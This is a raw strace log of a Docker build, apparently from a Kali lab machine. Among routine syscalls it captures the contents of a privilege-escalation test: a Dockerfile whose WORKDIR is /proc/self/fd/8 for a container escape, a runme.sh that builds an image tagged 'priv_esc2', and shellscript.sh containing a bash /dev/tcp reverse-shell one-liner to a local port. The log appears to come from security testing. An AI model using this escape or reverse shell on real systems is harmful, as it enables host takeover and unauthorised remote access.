113253 03:07:16.113043 <... close resumed>) = 0 <0.000048>
113253 03:07:16.113069 newfstatat(AT_FDCWD</home/kali/Desktop/tariq>, "/home/kali/Desktop/tariq/Dockerfile", {st_dev=makedev(0x8, 0x1), st_ino=3146378, st_mode=S_IFREG|0644, st_nlink=1, st_uid=1000, st_gid=1000, st_blksize=4096, st_blocks=8, st_size=274, st_atime=1711782175 /* 2024-03-30T03:02:55.471320521-0400 */, st_atime_nsec=471320521, st_mtime=1711782173 /* 2024-03-30T03:02:53.167320521-0400 */, st_mtime_nsec=167320521, st_ctime=1711782173 /* 2024-03-30T03:02:53.167320521-0400 */, st_ctime_nsec=167320521}, AT_SYMLINK_NOFOLLOW) = 0 <0.000005>
113253 03:07:16.113107 newfstatat(AT_FDCWD</home/kali/Desktop/tariq>, "/home/kali/Desktop/tariq/Dockerfile", {st_dev=makedev(0x8, 0x1), st_ino=3146378, st_mode=S_IFREG|0644, st_nlink=1, st_uid=1000, st_gid=1000, st_blksize=4096, st_blocks=8, st_size=274, st_atime=1711782175 /* 2024-03-30T03:02:55.471320521-0400 */, st_atime_nsec=471320521, st_mtime=1711782173 /* 2024-03-30T03:02:53.167320521-0400 */, st_mtime_nsec=167320521, st_ctime=1711782173 /* 2024-03-30T03:02:53.167320521-0400 */, st_ctime_nsec=167320521}, AT_SYMLINK_NOFOLLOW) = 0 <0.000004>
113253 03:07:16.113145 newfstatat(AT_FDCWD</home/kali/Desktop/tariq>, "/etc/nsswitch.conf", {st_dev=makedev(0x8, 0x1), st_ino=524617, st_mode=S_IFREG|0644, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=8, st_size=558, st_atime=1711777099 /* 2024-03-30T01:38:19.263320521-0400 */, st_atime_nsec=263320521, st_mtime=1692643993 /* 2023-08-21T14:53:13.820000000-0400 */, st_mtime_nsec=820000000, st_ctime=1692648141 /* 2023-08-21T16:02:21.960000000-0400 */, st_ctime_nsec=960000000}, 0) = 0 <0.000005>
113253 03:07:16.113180 openat(AT_FDCWD</home/kali/Desktop/tariq>, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 7</etc/passwd> <0.000007>
113253 03:07:16.113208 newfstatat(7</etc/passwd>, "", {st_dev=makedev(0x8, 0x1), st_ino=524736, st_mode=S_IFREG|0644, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=8, st_size=3163, st_atime=1711776901 /* 2024-03-30T01:35:01.799320521-0400 */, st_atime_nsec=799320521, st_mtime=1692644384 /* 2023-08-21T14:59:44.924000000-0400 */, st_mtime_nsec=924000000, st_ctime=1692648141 /* 2023-08-21T16:02:21.968000000-0400 */, st_ctime_nsec=968000000}, AT_EMPTY_PATH) = 0 <0.000004>
113253 03:07:16.113240 lseek(7</etc/passwd>, 0, SEEK_SET) = 0 <0.000004>
113253 03:07:16.113259 read(7</etc/passwd>, "root:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/"..., 4096) = 3163 <0.000005>
113258 03:07:16.113306 <... epoll_pwait resumed>[{events=EPOLLOUT, data={u32=3998744578, u64=9204545914999930882}}], 128, 4975, NULL, 0) = 1 <0.025625>
113255 03:07:16.113403 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113253 03:07:16.113420 lseek(7</etc/passwd>, 3163, SEEK_SET) = 3163 <0.000007>
113253 03:07:16.113443 close(7</etc/passwd>) = 0 <0.000005>
113253 03:07:16.113469 futex(0x55c9e4ddcca8, FUTEX_WAIT_PRIVATE, 0, NULL <unfinished ...>
113258 03:07:16.113589 futex(0xc00042a548, FUTEX_WAIT_PRIVATE, 0, NULL <unfinished ...>
113255 03:07:16.113639 <... epoll_pwait resumed>[], 128, 0, NULL, 0) = 0 <0.000218>
113254 03:07:16.113653 <... nanosleep resumed>NULL) = 0 <0.000781>
113254 03:07:16.114023 futex(0x55c9e4ddd060, FUTEX_WAIT_PRIVATE, 0, {tv_sec=4, tv_nsec=949671834} <unfinished ...>
113255 03:07:16.114078 futex(0x55c9e4ddd060, FUTEX_WAKE_PRIVATE, 1) = 0 <0.000111>
113254 03:07:16.114248 <... futex resumed>) = -1 EAGAIN (Resource temporarily unavailable) <0.000208>
113255 03:07:16.114377 futex(0xc00042a548, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
113254 03:07:16.114427 sched_yield( <unfinished ...>
113258 03:07:16.114560 <... futex resumed>) = 0 <0.000957>
113255 03:07:16.114609 <... futex resumed>) = 1 <0.000218>
113254 03:07:16.114622 <... sched_yield resumed>) = 0 <0.000183>
113254 03:07:16.114734 futex(0x55c9e4ddcf78, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
113255 03:07:16.115415 newfstatat(AT_FDCWD</home/kali/Desktop/tariq>, "/etc/nsswitch.conf",  <unfinished ...>
113254 03:07:16.115473 <... futex resumed>) = 0 <0.000725>
113258 03:07:16.116017 futex(0x55c9e4ddcca8, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
113255 03:07:16.116067 <... newfstatat resumed>{st_dev=makedev(0x8, 0x1), st_ino=524617, st_mode=S_IFREG|0644, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=8, st_size=558, st_atime=1711777099 /* 2024-03-30T01:38:19.263320521-0400 */, st_atime_nsec=263320521, st_mtime=1692643993 /* 2023-08-21T14:53:13.820000000-0400 */, st_mtime_nsec=820000000, st_ctime=1692648141 /* 2023-08-21T16:02:21.960000000-0400 */, st_ctime_nsec=960000000}, 0) = 0 <0.000631>
113254 03:07:16.116091 nanosleep({tv_sec=0, tv_nsec=20000},  <unfinished ...>
113258 03:07:16.116336 <... futex resumed>) = 1 <0.000305>
113255 03:07:16.116386 openat(AT_FDCWD</home/kali/Desktop/tariq>, "/etc/passwd", O_RDONLY|O_CLOEXEC <unfinished ...>
113254 03:07:16.116406 <... nanosleep resumed>NULL) = 0 <0.000308>
113253 03:07:16.116412 <... futex resumed>) = 0 <0.002937>
113253 03:07:16.116426 futex(0x55c9e4ddd078, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
113254 03:07:16.116436 nanosleep({tv_sec=0, tv_nsec=20000},  <unfinished ...>
113253 03:07:16.116477 <... futex resumed>) = 0 <0.000043>
113258 03:07:16.116585 sched_yield( <unfinished ...>
113255 03:07:16.116645 <... openat resumed>) = 7</etc/passwd> <0.000238>
113253 03:07:16.116664 epoll_pwait(4<anon_inode:[eventpoll]>, [], 128, 0, NULL, 0) = 0 <0.000007>
113253 03:07:16.116687 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113258 03:07:16.116838 <... sched_yield resumed>) = 0 <0.000245>
113255 03:07:16.116888 newfstatat(7</etc/passwd>, "",  <unfinished ...>
113254 03:07:16.116909 <... nanosleep resumed>NULL) = 0 <0.000466>
113258 03:07:16.117624 futex(0x55c9e4ddcf78, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
113255 03:07:16.117678 <... newfstatat resumed>{st_dev=makedev(0x8, 0x1), st_ino=524736, st_mode=S_IFREG|0644, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=8, st_size=3163, st_atime=1711776901 /* 2024-03-30T01:35:01.799320521-0400 */, st_atime_nsec=799320521, st_mtime=1692644384 /* 2023-08-21T14:59:44.924000000-0400 */, st_mtime_nsec=924000000, st_ctime=1692648141 /* 2023-08-21T16:02:21.968000000-0400 */, st_ctime_nsec=968000000}, AT_EMPTY_PATH) = 0 <0.000768>
113254 03:07:16.117704 nanosleep({tv_sec=0, tv_nsec=20000},  <unfinished ...>
113258 03:07:16.117902 <... futex resumed>) = 0 <0.000263>
113255 03:07:16.117916 lseek(7</etc/passwd>, 0, SEEK_SET <unfinished ...>
113258 03:07:16.117940 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113255 03:07:16.117950 <... lseek resumed>) = 0 <0.000023>
113258 03:07:16.117961 <... epoll_pwait resumed>[], 128, 0, NULL, 0) = 0 <0.000012>
113255 03:07:16.117968 read(7</etc/passwd>,  <unfinished ...>
113258 03:07:16.117984 mmap(NULL, 65536, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
113255 03:07:16.117991 <... read resumed>"root:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/"..., 4096) = 3163 <0.000016>
113258 03:07:16.118026 <... mmap resumed>) = 0x7fbd1c2b3000 <0.000035>
113255 03:07:16.118033 close(7</etc/passwd> <unfinished ...>
113258 03:07:16.118054 mmap(NULL, 262144, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
113255 03:07:16.118061 <... close resumed>) = 0 <0.000020>
113258 03:07:16.118077 <... mmap resumed>) = 0x7fbd1c273000 <0.000016>
113255 03:07:16.118083 sched_yield( <unfinished ...>
113258 03:07:16.118106 futex(0xc00007cd48, FUTEX_WAKE_PRIVATE, 1) = 1 <0.000007>
113256 03:07:16.118123 <... futex resumed>) = 0 <0.037324>
113258 03:07:16.118357 futex(0x55c9e4ddd078, FUTEX_WAIT_PRIVATE, 0, {tv_sec=0, tv_nsec=100000} <unfinished ...>
113256 03:07:16.118373 mmap(NULL, 262144, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fbd1c233000 <0.000049>
113256 03:07:16.118451 futex(0x55c9e4ddd078, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
113258 03:07:16.118502 <... futex resumed>) = 0 <0.000128>
113256 03:07:16.118515 <... futex resumed>) = 1 <0.000056>
113254 03:07:16.118672 <... nanosleep resumed>NULL) = 0 <0.000961>
113258 03:07:16.118721 futex(0xc00042a548, FUTEX_WAIT_PRIVATE, 0, NULL <unfinished ...>
113256 03:07:16.118736 nanosleep({tv_sec=0, tv_nsec=3000},  <unfinished ...>
113258 03:07:16.118785 <... futex resumed>) = -1 EAGAIN (Resource temporarily unavailable) <0.000050>
113255 03:07:16.118800 <... sched_yield resumed>) = 0 <0.000713>
113254 03:07:16.118949 futex(0xc00042a548, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
113258 03:07:16.119000 sched_yield( <unfinished ...>
113256 03:07:16.119014 <... nanosleep resumed>NULL) = 0 <0.000270>
113255 03:07:16.119026 futex(0x55c9e4ddcf78, FUTEX_WAIT_PRIVATE, 2, NULL <unfinished ...>
113256 03:07:16.119033 sched_yield( <unfinished ...>
113258 03:07:16.119043 <... sched_yield resumed>) = 0 <0.000031>
113256 03:07:16.119048 <... sched_yield resumed>) = 0 <0.000012>
113255 03:07:16.119056 <... futex resumed>) = -1 EAGAIN (Resource temporarily unavailable) <0.000024>
113254 03:07:16.119100 <... futex resumed>) = 0 <0.000137>
113258 03:07:16.119115 futex(0x55c9e4ddcf78, FUTEX_WAIT_PRIVATE, 2, NULL <unfinished ...>
113256 03:07:16.119123 futex(0x55c9e4ddcf78, FUTEX_WAIT_PRIVATE, 2, NULL <unfinished ...>
113255 03:07:16.119247 futex(0x55c9e4ddcf78, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
113254 03:07:16.119298 futex(0x55c9e4ddcf78, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
113258 03:07:16.122215 <... futex resumed>) = 0 <0.003093>
113256 03:07:16.122229 <... futex resumed>) = 0 <0.003102>
113255 03:07:16.122240 <... futex resumed>) = 1 <0.002980>
113254 03:07:16.122283 <... futex resumed>) = 1 <0.002970>
113258 03:07:16.122298 futex(0x55c9e4ddcf78, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
113256 03:07:16.122305 futex(0x55c9e4ddcf78, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
113258 03:07:16.122316 <... futex resumed>) = 0 <0.000012>
113256 03:07:16.122322 <... futex resumed>) = 0 <0.000012>
113258 03:07:16.122385 futex(0xc00042a548, FUTEX_WAIT_PRIVATE, 0, NULL <unfinished ...>
113256 03:07:16.122396 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0 <unfinished ...>
113255 03:07:16.122416 futex(0xc00007c948, FUTEX_WAIT_PRIVATE, 0, NULL <unfinished ...>
113254 03:07:16.122461 nanosleep({tv_sec=0, tv_nsec=20000},  <unfinished ...>
113256 03:07:16.122479 <... socket resumed>) = 7<UNIX-STREAM:[280080]> <0.000076>
113256 03:07:16.122555 connect(7<UNIX-STREAM:[280080]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory) <0.000013>
113256 03:07:16.122607 close(7<UNIX-STREAM:[280080]>) = 0 <0.000007>
113256 03:07:16.122646 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 7<UNIX-STREAM:[280087]> <0.000006>
113256 03:07:16.122719 connect(7<UNIX-STREAM:[280087]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory) <0.000009>
113256 03:07:16.122778 close(7<UNIX-STREAM:[280087]>) = 0 <0.000006>
113256 03:07:16.122826 newfstatat(AT_FDCWD</home/kali/Desktop/tariq>, "/etc/nsswitch.conf", {st_dev=makedev(0x8, 0x1), st_ino=524617, st_mode=S_IFREG|0644, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=8, st_size=558, st_atime=1711777099 /* 2024-03-30T01:38:19.263320521-0400 */, st_atime_nsec=263320521, st_mtime=1692643993 /* 2023-08-21T14:53:13.820000000-0400 */, st_mtime_nsec=820000000, st_ctime=1692648141 /* 2023-08-21T16:02:21.960000000-0400 */, st_ctime_nsec=960000000}, 0) = 0 <0.000005>
113256 03:07:16.122863 openat(AT_FDCWD</home/kali/Desktop/tariq>, "/etc/group", O_RDONLY|O_CLOEXEC) = 7</etc/group> <0.000007>
113256 03:07:16.122891 newfstatat(7</etc/group>, "", {st_dev=makedev(0x8, 0x1), st_ino=527551, st_mode=S_IFREG|0644, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=8, st_size=1315, st_atime=1711778155 /* 2024-03-30T01:55:55.651320521-0400 */, st_atime_nsec=651320521, st_mtime=1711691743 /* 2024-03-29T01:55:43.160608400-0400 */, st_mtime_nsec=160608400, st_ctime=1711691743 /* 2024-03-29T01:55:43.164606400-0400 */, st_ctime_nsec=164606400}, AT_EMPTY_PATH) = 0 <0.000004>
113256 03:07:16.122923 lseek(7</etc/group>, 0, SEEK_SET) = 0 <0.000004>
113256 03:07:16.122942 read(7</etc/group>, "root:x:0:\ndaemon:x:1:\nbin:x:2:\nsys:x:3:\nadm:x:4:kali\ntty:x:5:\ndisk:x:6:\nlp:x:7:\nmail:x:8:\nnews:x:9:\nuucp:x:10:\nman:x:12:\nproxy:x:13:\nkmem:x:15:\ndialout:x:20:kali\nfax:x:21:\nvoice:x:22:\ncdrom:x:24:kali\nfloppy:x:25:kali\ntape:x:26:\nsudo:x:27:kali\naudio:x:29:pu"..., 4096) = 1315 <0.000004>
113256 03:07:16.122970 close(7</etc/group>) = 0 <0.000004>
113256 03:07:16.122997 lgetxattr("/home/kali/Desktop/tariq/Dockerfile", "security.capability", 0xc00011ad00, 128) = -1 ENODATA (No data available) <0.000007>
113256 03:07:16.123055 openat(AT_FDCWD</home/kali/Desktop/tariq>, "/home/kali/Desktop/tariq/Dockerfile", O_RDONLY|O_CLOEXEC) = 7</home/kali/Desktop/tariq/Dockerfile> <0.000010>
113256 03:07:16.123097 fcntl(7</home/kali/Desktop/tariq/Dockerfile>, F_GETFL) = 0x8000 (flags O_RDONLY|O_LARGEFILE) <0.000004>
113256 03:07:16.123118 fcntl(7</home/kali/Desktop/tariq/Dockerfile>, F_SETFL, O_RDONLY|O_NONBLOCK|O_LARGEFILE) = 0 <0.000003>
113256 03:07:16.123136 epoll_ctl(4<anon_inode:[eventpoll]>, EPOLL_CTL_ADD, 7</home/kali/Desktop/tariq/Dockerfile>, {events=EPOLLIN|EPOLLOUT|EPOLLRDHUP|EPOLLET, data={u32=3982491654, u64=9204545914983677958}}) = -1 EPERM (Operation not permitted) <0.000006>
113256 03:07:16.123188 fcntl(7</home/kali/Desktop/tariq/Dockerfile>, F_GETFL) = 0x8800 (flags O_RDONLY|O_NONBLOCK|O_LARGEFILE) <0.000004>
113256 03:07:16.123209 fcntl(7</home/kali/Desktop/tariq/Dockerfile>, F_SETFL, O_RDONLY|O_LARGEFILE) = 0 <0.000003>
113256 03:07:16.123240 read(7</home/kali/Desktop/tariq/Dockerfile>, "# Use the debian:bookworm image as the base\nFROM debian:bookworm\n\n# Set the working directory to /proc/self/fd/8\nWORKDIR /proc/self/fd/8\n\n# When the container is run, execute the command\n#CMD [\"sh\", \"-c\", \"cd ../../../../../../../../\", \"ls\"]\nCMD cd ../../."..., 32768) = 274 <0.000005>
113256 03:07:16.123268 read(7</home/kali/Desktop/tariq/Dockerfile>, "", 32494) = 0 <0.000004>
113256 03:07:16.123287 close(7</home/kali/Desktop/tariq/Dockerfile>) = 0 <0.000004>
113256 03:07:16.123310 newfstatat(AT_FDCWD</home/kali/Desktop/tariq>, "/home/kali/Desktop/tariq/runme.sh", {st_dev=makedev(0x8, 0x1), st_ino=3146930, st_mode=S_IFREG|0755, st_nlink=1, st_uid=1000, st_gid=1000, st_blksize=4096, st_blocks=8, st_size=93, st_atime=1711782435 /* 2024-03-30T03:07:15.959320521-0400 */, st_atime_nsec=959320521, st_mtime=1711782430 /* 2024-03-30T03:07:10.103320521-0400 */, st_mtime_nsec=103320521, st_ctime=1711782430 /* 2024-03-30T03:07:10.103320521-0400 */, st_ctime_nsec=103320521}, AT_SYMLINK_NOFOLLOW) = 0 <0.000005>
113256 03:07:16.123344 newfstatat(AT_FDCWD</home/kali/Desktop/tariq>, "/home/kali/Desktop/tariq/runme.sh", {st_dev=makedev(0x8, 0x1), st_ino=3146930, st_mode=S_IFREG|0755, st_nlink=1, st_uid=1000, st_gid=1000, st_blksize=4096, st_blocks=8, st_size=93, st_atime=1711782435 /* 2024-03-30T03:07:15.959320521-0400 */, st_atime_nsec=959320521, st_mtime=1711782430 /* 2024-03-30T03:07:10.103320521-0400 */, st_mtime_nsec=103320521, st_ctime=1711782430 /* 2024-03-30T03:07:10.103320521-0400 */, st_ctime_nsec=103320521}, AT_SYMLINK_NOFOLLOW) = 0 <0.000004>
113256 03:07:16.123379 lgetxattr("/home/kali/Desktop/tariq/runme.sh", "security.capability", 0xc00011ae80, 128) = -1 ENODATA (No data available) <0.000005>
113256 03:07:16.123406 openat(AT_FDCWD</home/kali/Desktop/tariq>, "/home/kali/Desktop/tariq/runme.sh", O_RDONLY|O_CLOEXEC) = 7</home/kali/Desktop/tariq/runme.sh> <0.000007>
113256 03:07:16.123434 fcntl(7</home/kali/Desktop/tariq/runme.sh>, F_GETFL) = 0x8000 (flags O_RDONLY|O_LARGEFILE) <0.000003>
113256 03:07:16.123452 fcntl(7</home/kali/Desktop/tariq/runme.sh>, F_SETFL, O_RDONLY|O_NONBLOCK|O_LARGEFILE) = 0 <0.000003>
113256 03:07:16.123470 epoll_ctl(4<anon_inode:[eventpoll]>, EPOLL_CTL_ADD, 7</home/kali/Desktop/tariq/runme.sh>, {events=EPOLLIN|EPOLLOUT|EPOLLRDHUP|EPOLLET, data={u32=3982491655, u64=9204545914983677959}}) = -1 EPERM (Operation not permitted) <0.000004>
113256 03:07:16.123493 fcntl(7</home/kali/Desktop/tariq/runme.sh>, F_GETFL) = 0x8800 (flags O_RDONLY|O_NONBLOCK|O_LARGEFILE) <0.000003>
113256 03:07:16.123511 fcntl(7</home/kali/Desktop/tariq/runme.sh>, F_SETFL, O_RDONLY|O_LARGEFILE) = 0 <0.000003>
113256 03:07:16.123530 read(7</home/kali/Desktop/tariq/runme.sh>, "#!/bin/bash\nsudo docker build -t \"priv_esc2\" .\nsudo docker run priv_esc2\necho \"success \360\237\230\210\"\n", 32768) = 93 <0.000005>
113256 03:07:16.123554 read(7</home/kali/Desktop/tariq/runme.sh>, "", 32675) = 0 <0.000004>
113256 03:07:16.123573 close(7</home/kali/Desktop/tariq/runme.sh>) = 0 <0.000004>
113256 03:07:16.123593 newfstatat(AT_FDCWD</home/kali/Desktop/tariq>, "/home/kali/Desktop/tariq/shellscript.sh", {st_dev=makedev(0x8, 0x1), st_ino=3146449, st_mode=S_IFREG|0755, st_nlink=1, st_uid=1000, st_gid=1000, st_blksize=4096, st_blocks=8, st_size=84, st_atime=1711781345 /* 2024-03-30T02:49:05.391320521-0400 */, st_atime_nsec=391320521, st_mtime=1711781318 /* 2024-03-30T02:48:38.243320521-0400 */, st_mtime_nsec=243320521, st_ctime=1711781318 /* 2024-03-30T02:48:38.243320521-0400 */, st_ctime_nsec=243320521}, AT_SYMLINK_NOFOLLOW) = 0 <0.000005>
113256 03:07:16.123623 newfstatat(AT_FDCWD</home/kali/Desktop/tariq>, "/home/kali/Desktop/tariq/shellscript.sh", {st_dev=makedev(0x8, 0x1), st_ino=3146449, st_mode=S_IFREG|0755, st_nlink=1, st_uid=1000, st_gid=1000, st_blksize=4096, st_blocks=8, st_size=84, st_atime=1711781345 /* 2024-03-30T02:49:05.391320521-0400 */, st_atime_nsec=391320521, st_mtime=1711781318 /* 2024-03-30T02:48:38.243320521-0400 */, st_mtime_nsec=243320521, st_ctime=1711781318 /* 2024-03-30T02:48:38.243320521-0400 */, st_ctime_nsec=243320521}, AT_SYMLINK_NOFOLLOW) = 0 <0.000004>
113256 03:07:16.123652 lgetxattr("/home/kali/Desktop/tariq/shellscript.sh", "security.capability", 0xc00011af80, 128) = -1 ENODATA (No data available) <0.000005>
113256 03:07:16.123675 openat(AT_FDCWD</home/kali/Desktop/tariq>, "/home/kali/Desktop/tariq/shellscript.sh", O_RDONLY|O_CLOEXEC) = 7</home/kali/Desktop/tariq/shellscript.sh> <0.000006>
113256 03:07:16.123702 fcntl(7</home/kali/Desktop/tariq/shellscript.sh>, F_GETFL) = 0x8000 (flags O_RDONLY|O_LARGEFILE) <0.000003>
113256 03:07:16.123720 fcntl(7</home/kali/Desktop/tariq/shellscript.sh>, F_SETFL, O_RDONLY|O_NONBLOCK|O_LARGEFILE) = 0 <0.000003>
113256 03:07:16.123737 epoll_ctl(4<anon_inode:[eventpoll]>, EPOLL_CTL_ADD, 7</home/kali/Desktop/tariq/shellscript.sh>, {events=EPOLLIN|EPOLLOUT|EPOLLRDHUP|EPOLLET, data={u32=3982491656, u64=9204545914983677960}}) = -1 EPERM (Operation not permitted) <0.000003>
113256 03:07:16.123759 fcntl(7</home/kali/Desktop/tariq/shellscript.sh>, F_GETFL) = 0x8800 (flags O_RDONLY|O_NONBLOCK|O_LARGEFILE) <0.000003>
113256 03:07:16.123777 fcntl(7</home/kali/Desktop/tariq/shellscript.sh>, F_SETFL, O_RDONLY|O_LARGEFILE) = 0 <0.000004>
113256 03:07:16.123799 read(7</home/kali/Desktop/tariq/shellscript.sh>, "#!/bin/bash\n\ncd ../../../../../../../../ && bash -i >& /dev/tcp/127.0.0.1/4142 0>&1\n", 32768) = 84 <0.000004>
113256 03:07:16.123821 read(7</home/kali/Desktop/tariq/shellscript.sh>, "", 32684) = 0 <0.000004>
113256 03:07:16.123839 close(7</home/kali/Desktop/tariq/shellscript.sh>) = 0 <0.000004>
113256 03:07:16.123862 futex(0xc00042a548, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
113258 03:07:16.123873 <... futex resumed>) = 0 <0.001478>
113256 03:07:16.123879 <... futex resumed>) = 1 <0.000011>
113258 03:07:16.123906 futex(0xc00042a548, FUTEX_WAIT_PRIVATE, 0, NULL <unfinished ...>
113256 03:07:16.123916 write(3<UNIX-STREAM:[280071->279015]>, "1000\r\nDockerfile\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0000100644\0000000000\0000000000\00000000000422\00014601734435\000012746\0 0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 4096) = 4096 <0.000069>
113256 03:07:16.124033 write(3<UNIX-STREAM:[280071->279015]>, "\0\0\0\0\0\0\r\n", 8) = 8 <0.000009>
113256 03:07:16.124071 ioctl(0</dev/pts/8<char 136:8>>, TIOCGWINSZ, {ws_row=51, ws_col=236, ws_xpixel=0, ws_ypixel=0}) = 0 <0.000008>
113256 03:07:16.124246 ioctl(0</dev/pts/8<char 136:8>>, TIOCGWINSZ <unfinished ...>
113253 03:07:16.124269 <... epoll_pwait resumed>[{events=EPOLLOUT, data={u32=3998744578, u64=9204545914999930882}}], 128, 4946, NULL, 0) = 1 <0.007574>
113256 03:07:16.124285 <... ioctl resumed>, {ws_row=51, ws_col=236, ws_xpixel=0, ws_ypixel=0}) = 0 <0.000021>
113253 03:07:16.124300 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113256 03:07:16.124313 write(1</dev/pts/8<char 136:8>>, "Sending build context to Docker daemon  4.096kB\r", 48 <unfinished ...>
113253 03:07:16.124346 <... epoll_pwait resumed>[], 128, 0, NULL, 0) = 0 <0.000036>
113256 03:07:16.124358 <... write resumed>) = 48 <0.000032>
113253 03:07:16.124367 epoll_pwait(4<anon_inode:[eventpoll]>,  <unfinished ...>
113251 03:07:16.124378 <... ppoll resumed>) = 1 ([{fd=9, revents=POLLIN}]) <0.095779>
113256 03:07:16.124398 write(1</dev/pts/8<char 136:8>>, "\r\n", 2 <unfinished ...>
113251 03:07:16.124418 rt_sigaction(SIGTTIN, {sa_handler=0x5567758b9420, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510},  <unfinished ...>
113256 03:07:16.124431 <... write resumed>) = 2 <0.000023>
113251 03:07:16.124443 <... rt_sigaction resumed>{sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000016>
113256 03:07:16.124455 write(3<UNIX-STREAM:[280071->279015]>, "0\r\n\r\n", 5 <unfinished ...>
113251 03:07:16.124470 read(9</dev/ptmx<char 5:2>>,  <unfinished ...>
113256 03:07:16.124491 <... write resumed>) = 5 <0.000026>
113251 03:07:16.124504 <... read resumed>"Sending build context to Docker daemon  4.096kB\r\r\r\n", 65536) = 51 <0.000024>
113256 03:07:16.124516 futex(0xc00042a548, FUTEX_WAKE_PRIVATE, 1 <unfinished ...>
113251 03:07:16.124525 rt_sigaction(SIGTTIN, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510},  <unfinished ...>
113258 03:07:16.124536 <... futex resumed>) = 0 <0.000621>
113256 03:07:16.124542 <... futex resumed>) = 1 <0.000021>
113251 03:07:16.124553 <... rt_sigaction resumed>NULL, 8) = 0 <0.000021>
113258 03:07:16.124564 futex(0xc00042a548, FUTEX_WAIT_PRIVATE, 0, NULL <unfinished ...>
113256 03:07:16.124572 futex(0xc00007cd48, FUTEX_WAIT_PRIVATE, 0, NULL <unfinished ...>
113251 03:07:16.124579 rt_sigprocmask(SIG_BLOCK, [INT QUIT TSTP TTIN TTOU], [], 8) = 0 <0.000003>
113251 03:07:16.124596 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 <0.000003>
113251 03:07:16.124614 ppoll([{fd=11<UNIX-STREAM:[280011->280012]>, events=POLLIN}, {fd=3<pipe:[279955]>, events=POLLIN}, {fd=9</dev/ptmx<char 5:2>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLIN}, {fd=8</dev/tty<char 5:0>>, events=POLLOUT}], 5, NULL, NULL, 8) = 1 ([{fd=8, revents=POLLOUT}]) <0.000007>
113251 03:07:16.124655 rt_sigaction(SIGTTOU, {sa_handler=0x5567758b9430, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f1dfcf20510}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, 8) = 0 <0.000003>
113251 03:07:16.124673 write(8</dev/tty<char 5:0>>, "Sending build context to Docker daemon  4.096kB\r\r\r\n", 51) = 51 <0.000126>
113251 03:07:16.124824 rt_sigaction(SIGTTOU, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f1dfcf20510}, NULL, 8) = 0 <0.000004>
